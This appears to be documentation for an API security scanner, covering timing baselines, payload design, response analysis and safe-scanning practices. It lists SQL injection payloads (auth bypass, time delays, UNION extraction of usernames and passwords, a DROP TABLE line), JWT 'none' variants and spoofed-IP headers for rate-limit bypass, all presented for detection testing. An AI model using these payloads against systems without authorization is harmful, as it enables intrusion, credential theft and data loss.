# How Security Scanning Actually Works

This doc covers the techniques behind API security scanning. How detection works, what makes a good payload, and the tradeoffs between thoroughness and noise.

## The Scanning Process

Every scanner follows the same general flow.

```
1. Establish baseline (normal behavior)
2. Send test payloads
3. Observe differences from baseline
4. Classify findings
5. Collect evidence
```

The key insight: vulnerability detection is about finding anomalies. Normal requests produce normal responses. Malicious requests produce different responses. The difference reveals the vulnerability.

## Baseline Timing

Time based attacks need accurate baselines. Network latency varies. Server response time varies. You need to distinguish between normal variance and injected delays.

```python
def get_baseline_timing(endpoint, samples=5):
    times = []
    for _ in range(samples):
        response = make_request("GET", endpoint)
        times.append(response.elapsed)
        time.sleep(0.5)

    return mean(times), stdev(times)
```

Taking multiple samples and calculating standard deviation lets you set a proper threshold.

```python
threshold = baseline_mean + (3 * baseline_stdev)
```

If your baseline is 200ms with a standard deviation of 50ms, your threshold is 350ms. A response taking 5.2 seconds when you injected a 5 second delay is clearly the attack working, not network issues.

## Payload Design

Good payloads are specific. They test one thing and produce a clear signal.

### SQL Injection Payloads

Basic auth bypass payloads:
```
' OR '1'='1
' OR 1=1--
admin'--
```

These work against string fields in WHERE clauses. The quote breaks out of the value, the OR makes the condition always true, and the comment (-- or #) ignores the rest of the query.

Time delay payloads vary by database:
```
'; WAITFOR DELAY '0:0:5'--     (MSSQL)
'; SELECT SLEEP(5)--           (MySQL)
'; pg_sleep(5)--               (PostgreSQL)
```

Each database has different syntax for delays. The scanner tries multiple variants to identify which database is in use.

Union payloads for data extraction:
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT username,password FROM users--
```

The number of NULLs must match the column count of the original query. Scanners typically try 1, 2, 3, etc. until one works.

### Authentication Payloads

JWT none algorithm variants:
```python
["none", "None", "NONE", "nOnE", "NoNe"]
```

Case variations catch libraries that only check for lowercase "none" but accept mixed case.

Invalid tokens to test error handling:
```python
["", "invalid", "null", "undefined", "' OR '1'='1"]
```

If any of these get a 200 response, the token validation is broken.

### Rate Limit Bypass Headers

```python
[
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "10.0.0.1"},
    {"X-Originating-IP": "192.168.1.1"},
    {"X-Client-IP": "8.8.8.8"},
    {"CF-Connecting-IP": "1.1.1.1"},
    {"True-Client-IP": "172.16.0.1"},
]
```

Each header is tested with rotating IP values. If requests with different spoofed IPs all succeed while requests without the header get blocked, the rate limiter trusts that header.

## Response Analysis

Different vulnerabilities produce different signals.

### Error Messages

SQL injection often produces database errors.

```python
error_signatures = {
    "mysql": ["sql syntax", "mysql_fetch", "warning: mysql"],
    "postgres": ["pg_query", "pg_exec", "pgsql"],
    "mssql": ["odbc sql server", "sqlexception"],
    "oracle": ["ora-", "pl/sql"],
}

for db_type, signatures in error_signatures.items():
    for signature in signatures:
        if signature in response.text.lower():
            return {"vulnerable": True, "database_type": db_type}
```

The error message also reveals the database type, which informs which payloads to try next.

### Response Length Differences

Boolean based blind SQLi detection relies on response length.

```python
true_response = make_request("GET", "/?id=1 AND 1=1")
false_response = make_request("GET", "/?id=1 AND 1=2")

length_diff = abs(len(true_response.text) - len(false_response.text))

if length_diff > 100:
    return {"vulnerable": True, "confidence": "HIGH" if length_diff > 500 else "MEDIUM"}
```

A large difference means the database is evaluating the boolean condition. The query structure is being modified by the input.

### Status Codes

Status codes reveal a lot.

| Code | Meaning for Testing |
|------|---------------------|
| 200 | Request succeeded, possibly vulnerable |
| 401 | Authentication required (expected for auth tests) |
| 403 | Forbidden (authorization working) |
| 404 | Resource not found (might be good for IDOR) |
| 429 | Rate limited (rate limiter working) |
| 500 | Server error (might indicate crash from payload) |

A 200 on an endpoint that should require auth is a vulnerability. A 429 when testing rate limits means they work. A 500 from a SQL payload might indicate injection but also might just be a crash.

### Timing

Timing analysis requires statistical rigor.

```python
baseline_mean, baseline_stdev = get_baseline_timing("/")
delay_seconds = 5
expected_delay = baseline_mean + delay_seconds

for payload in time_based_payloads:
    times = []
    for _ in range(3):  # Multiple samples per payload
        response = make_request("GET", f"/?id={payload}")
        times.append(response.elapsed)
        time.sleep(1)

    avg_time = mean(times)

    if avg_time >= expected_delay - 1:  # Allow 1 second tolerance
        return {"vulnerable": True}
```

Three samples per payload reduces false positives from network hiccups. The tolerance accounts for timing imprecision.

## False Positives and Confidence

Not every anomaly is a vulnerability. Scanners need to distinguish real findings from noise.

### High Confidence Indicators

- Database error strings in response (SQLi)
- Token with "none" algorithm accepted (JWT)
- 5+ second response when 5 second delay injected (Time based SQLi)
- Different IDs accessible with same auth token (IDOR)

### Lower Confidence Indicators

- Response length differences (might be caching)
- Single timing anomaly (network variance)
- 500 errors (might be unrelated crash)

The scanner assigns confidence levels based on how definitive the evidence is.

```python
if response_time >= expected_delay:
    confidence = "HIGH"
elif response_time >= expected_delay * 0.8:
    confidence = "MEDIUM"
```

## Scanning Safely

Security scanning can break things. These practices minimize damage.

### Request Spacing

Never send requests as fast as possible.

```python
required_delay = 1.0 / (max_requests / window_seconds)
time.sleep(required_delay + random_jitter)
```

This protects:
- Target servers from being overwhelmed
- Your scanner from being blocked
- Timing measurements from being skewed

### Read Only Operations

The scanner uses GET requests where possible and avoids destructive payloads.

```python
# Testing payloads
"' OR '1'='1"      # Yes: tests injection without modification
"'; DROP TABLE--"  # Included but dangerous on real data
```

Even though the payloads include statements like DROP TABLE, the scanner is testing for the vulnerability, not exploiting it. If the database is vulnerable, the SELECT from the OR clause would work anyway.

### Authentication Scope

When testing authenticated endpoints, the scanner uses the provided token consistently.

```python
if self.auth_token:
    session.headers.update({"Authorization": f"Bearer {self.auth_token}"})
```

This means:
- Tests stay within authorized scope
- IDOR tests check if you can access other users' data, not if you can bypass auth entirely
- Results are relevant to your access level

### Error Recovery

Failed requests do not crash the scan.

```python
try:
    result = scanner.scan()
except Exception as e:
    result = TestResultCreate(
        status="error",
        details=f"Scanner error: {str(e)}",
    )
```

Network timeouts, connection resets, and unexpected responses are handled. The scan continues with remaining tests.

## Interpreting Results

Scanner output needs human interpretation.

### Vulnerable Status

The scanner found evidence of a vulnerability. Review the evidence to confirm:
- Is the payload visible in the evidence?
- Does the detection method match the vulnerability type?
- Could this be a false positive?

### Safe Status

No vulnerability detected with the payloads tested. This does not mean the target is secure. It means these specific tests passed.

```
"No SQL injection vulnerabilities detected"

What this means: Standard SQLi payloads did not trigger errors or timing anomalies
What this does NOT mean: The application is immune to SQL injection
```

Different payloads, different endpoints, or different parameters might reveal vulnerabilities the scan missed.

### Error Status

The test could not complete. Check the error message:
- Connection refused: Target is down or blocking your IP
- Timeout: Target is slow or has aggressive rate limiting
- SSL error: Certificate issues

Errors mean you need to investigate before trusting the result.

## Limitations

No scanner finds everything. Understanding limitations helps you use results appropriately.

**Coverage**: The scanner tests a predefined set of payloads and techniques. Novel attack vectors are not covered.

**Depth**: Automated scanning is shallow compared to manual testing. Complex logic flaws require human analysis.

**Context**: The scanner does not understand your business logic. It cannot tell if a vulnerability matters for your specific application.

**Evasion**: Sophisticated applications might detect and block scanning patterns. Low and slow scanning helps but is not foolproof.

**False Negatives**: Passing all tests does not mean the application is secure. It means these specific tests passed against these specific endpoints with these specific inputs.

Use automated scanning as one layer of security testing, not the only layer. Combine with code review, manual penetration testing, and ongoing monitoring.
